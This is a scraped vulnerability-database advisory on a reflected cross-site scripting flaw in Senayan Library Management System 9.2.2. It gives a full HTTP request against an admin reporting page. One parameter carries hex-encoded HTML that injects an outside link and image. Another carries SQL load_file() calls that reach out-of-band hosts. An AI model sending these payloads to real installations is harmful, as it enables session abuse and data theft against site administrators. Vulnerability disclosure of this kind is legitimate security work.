---
title: Senayan Library Management System 9.2.2 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2022120047
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-28
fetch_date: 2025-10-04T02:34:16.054219
---

# Senayan Library Management System 9.2.2 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Senayan Library Management System 9.2.2 Cross Site Scripting** **2022.12.27**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

## Title: Senayan Library Management System v9.2.2 a.k.a SLIMS 9 XSS-Reflected - inserting gif - redirect to outside HTTPS server
## Author: nu11secur1ty
## Date: 12.21.2022
## Vendor: https://slims.web.id/web/
## Software: https://github.com/slims/slims9\_bulian/releases/tag/v9.2.2
## Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/slims.web.id/SLIMS-9.2.2
## Description:
The value of manual insertion `point 3` is copied into the HTML
document as plain text between tags.
The payload t8xqv<script>alert(1)</script>uou2q was submitted in the
manual insertion `point 3`.
This input was echoed unmodified in the application's response.
The attacker can trick the already authenticated users to visit a very
dangerous web page or malicious javascript exploit.
## STATUS: HIGH Vulnerability
[+] Payloads:
```GET
GET /slims9\_bulian-9.2.2/admin/modules/reporting/customs/loan\_by\_class.php?reportView=true&year=2002&class=%3c%61%20%68%72%65%66%3d%22%68%74%74%70%73%3a%2f%2f%77%77%77%2e%6e%75%31%31%73%65%63%75%72%31%74%79%2e%63%6f%6d%2f%22%3e%3c%69%6d%67%20%73%72%63%3d%68%74%74%70%73%3a%2f%2f%6d%65%64%69%61%2e%74%65%6e%6f%72%2e%63%6f%6d%2f%2d%4b%39%73%48%78%58%41%62%2d%63%41%41%41%41%43%2f%73%68%61%6d%65%2d%6f%6e%2d%79%6f%75%2d%70%61%74%72%69%63%69%61%2e%67%69%66%22%3e&membershipType=a%27%27&collType=aaaa%27%2b(select%20load\_file(%27%5c%5c%5c%5cdctiy0hziwzd4xujfqqcfd3uul0koac1fp6ft9hy.slims.web.id%5c%5cwtf%27))%2b%27%27%2b(select%20load\_file(%27%5c%5c%5c%5cazditm561h7fku3yj99us8ne258zwpkgn4eu1opd.slims.web.id%5c%5cdzd%27))%2b%27
HTTP/1.1
Host: pwnedhost.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107
Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: SenayanAdmin=ijs22qmki227r86feh6bppc56o; admin\_logged\_in=1
Connection: close
```
## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/slims.web.id/SLIMS-9.2.2)
## Proof and Exploit:
[href](https://streamable.com/mnpw30)
## Time spent
`00:05:00`

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022120047)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top